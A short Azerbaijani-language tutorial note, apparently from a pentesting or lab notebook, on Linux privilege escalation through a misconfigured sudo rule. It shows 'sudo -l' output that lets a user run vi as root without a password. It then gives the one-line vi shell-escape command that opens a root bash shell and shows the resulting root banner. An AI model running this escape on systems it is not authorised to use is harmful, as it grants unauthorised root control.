## Sudo -l 

bu kimi, müəyyən əmrləri root parolu olmadan kök istifadəçi kimi işlədə bildiyinizi görəcəksiniz. Bu, imtiyazları artırmağa imkan verə bilər.


Sudo -l verilende eger bunu gorursense:
-------
user8@polobox:~$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
user8@polobox:~$ 
-------

bunu yaz:
# sudo -u root /usr/bin/vi -c ':!/bin/bash' /dev/null

ve bele gorsenecek

user8@polobox:~$ sudo -u root /usr/bin/vi -c ':!/bin/bash' /dev/null

Welcome to Linux Lite 4.4 root
 
Monday 22 January 2024, 07:58:24
Memory Usage: 348/1991MB (17.48%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
